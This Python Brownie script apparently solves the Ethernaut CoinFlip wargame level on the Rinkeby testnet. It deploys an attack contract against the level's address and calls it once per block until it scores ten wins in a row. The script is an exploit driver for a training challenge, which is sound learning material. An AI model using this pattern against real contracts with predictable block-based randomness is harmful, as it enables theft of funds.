from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from web3 import Web3

import time
import json
import os

# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# attacker=accounts[0]
acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0xadB27e1510356D11046198a8563D9b75951C9b9E'

# # create the target contract object from ABI and existing deployed address
# f=open("abi.json")
# json_load=json.load(f)
# abi=json_load['abi']
# target_contract=Contract.from_abi("target_contract", "0xadB27e1510356D11046198a8563D9b75951C9b9E", abi)
# print('target_contract: ', target_contract.address)

# deploy attacker contract
attacker_contract=coinflipAttack.deploy(target_address, {'from': attacker, 'priority_fee': priority_fee})

def main():

    print('attacker_contract:', attacker_contract)

    wins=0
    previous_block_nb=chain.height-1

    while wins<10:
        
        block_nb=chain.height

        if previous_block_nb<block_nb-1:
            print('previous block number:', previous_block_nb)
            print('block number:', block_nb)
            # execute attacker contract and catch the return value
            tx=attacker_contract.preflip({'from': attacker, 'priority_fee': priority_fee})
            # tx_return=tx.return_value >> not accessible on Infura
            wins+=1
            print('previous block number:', previous_block_nb)
            print('block number:', block_nb)
            # print('tx_return:', tx_return)
            print('wins:', wins)
            previous_block_nb=block_nb
        else:
            time.sleep(0.5)
